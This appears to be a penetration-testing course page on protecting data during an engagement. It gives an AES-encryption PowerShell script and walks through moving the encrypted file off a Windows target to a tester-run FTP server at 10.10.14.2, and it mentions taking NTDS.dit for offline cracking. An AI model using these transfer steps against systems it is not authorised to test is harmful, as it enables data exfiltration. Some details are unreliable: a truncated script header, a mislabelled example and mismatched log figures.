# Protected File Transfers

As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), enumeration data that can contain key information about the organization's network infrastructure, and Active Directory (AD) environment, etc. . Therefore, it is essential to encrypt such information or use encrypted data connections such as SSH, SFTP, and HTTPS. However, it is possible that these options are not available to us and that a different approach is required.

``Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Rather, if attempting to test Data Loss Prevention controls/egress filtering protections create a file with dummy data that mimics the data that the client is trying to protect.``

Therefore, it is often necessary to encrypt the data or files before transfer to prevent the data from being read if they are intercepted in transit.

A data leakage during a penetration test could have serious consequences, both for the penetration tester and their company and the client. As information security professionals, it is our duty to act professionally and responsibly and take all measures to protect any data that we come across during an assessment.

## File Encryption on Windows
Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the Invoke-AESEncryption.ps1 PowerShell script. This script is small and provides encryption of files and strings.

### Invoke-AESEncryption.ps1
````powershell
Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
````
For the creation of the script on the target system, the known transfer methods can be used. After the script has been transferred, it only needs to be imported as a module.

### Import Module
````powershell
Import-Module .\Invoke-AESEncryption.ps1
````
After the script is imported, it can encrypt the strings or files as with the given examples. This command creates an encrypted file with the same name as the encrypted file, but with the extension ".aes."

### File Encryption
````powershell
Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
````

It is essential to use very strong and unique passwords for encryption for every company where a penetration test is performed. This is to prevent that such files and information cannot be decrypted using one single password that may have been leaked and cracked by a third party.

One of the easiest ways to transfer files from Windows to Linux is FTP. This can be done using the pyftpdlib module of Python 3. If it is not yet installed on the Linux system, it can be installed with the following command:

### Install pyftpdlib
````powershell
pip3 install pyftpdlib
````
If the module already exists, it should be started with specified credentials.

### Python3 FTP Server
````powershell
Ryohei@htb[/htb]$ python3 -m pyftpdlib --user=pentester --password=p4ssw0rd -w

[I 2020-11-18 12:22:37] concurrency model: async
[I 2020-11-18 12:22:37] masquerade (NAT) address: None
[I 2020-11-18 12:22:37] passive ports: None
[I 2020-11-18 12:22:37] >>> starting FTP server on 0.0.0.0:2121, pid=3954 <<<
````
By default, this FTP server runs on TCP port 2121. After the FTP server is set up, the transfer can be done by the Windows system. The pre-installed FTP client from Windows is used for this.

### File Transfer
````powershell
PS C:\htb> ftp

ftp> open 10.10.14.2 2121

Connected to 10.10.14.2.
220 pyftpdlib 1.5.6 ready.
530 Log in with USER and PASS first.
User (10.10.14.2:(none)): pentester

331 Username ok, send password.
Password: p4ssw0rd

230 Login successful.
ftp> put scan-results.txt.aes

200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp: 3448 bytes sent in 0.00Seconds 34000.00Kbytes/sec.
ftp> bye

221 Goodbye.
````

As soon as the transfer is done, this can be verified on the Linux system. The FTP server shows any activity that is being done on it.

### Receiving File
````powershell
<...SNIP...>
[I 2020-11-18 12:22:37] >>> starting FTP server on 0.0.0.0:2121, pid=3954 <<<
[I 2020-11-18 12:22:50] 10.129.2.128:53388-[] FTP session opened (connect)
[I 2020-11-18 12:22:55] 10.129.2.128:53388-[pentester] USER 'pentester' logged in.
[I 2020-11-18 12:23:02] 10.129.2.128.128:53388-[pentester] STOR /home/htb-student/htb/scan-results.txt.aes completed=1 bytes=34 seconds=0.026
[I 2020-11-18 12:23:05] 10.129.2.128:53388-[pentester] FTP session closed (disconnect).
[I 2020-11-18 12:24:23] received interrupt signal
[I 2020-11-18 12:24:23] >>> shutting down FTP server, 1 socket(s), pid=3954 <<<
````

To decrypt the file again, PowerShell is used on the Pwnbox. There, similar steps as on the Windows system take place. First, the script should be imported as a module, and then the file should be decrypted.

#### Receiving File
````bash
pwsh

PS /home/htb-student/htb> Import-Module Invoke-AESEncryption.ps1
PS /home/htb-student/htb> Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path ./scan-results.txt.aes

File decrypted to /home/htb-student/htb/scan-results.txt
PS /home/htb-student/htb> ls

Invoke-AESEncryption.ps1     scan-results.txt.aes     scan-results.txt
````
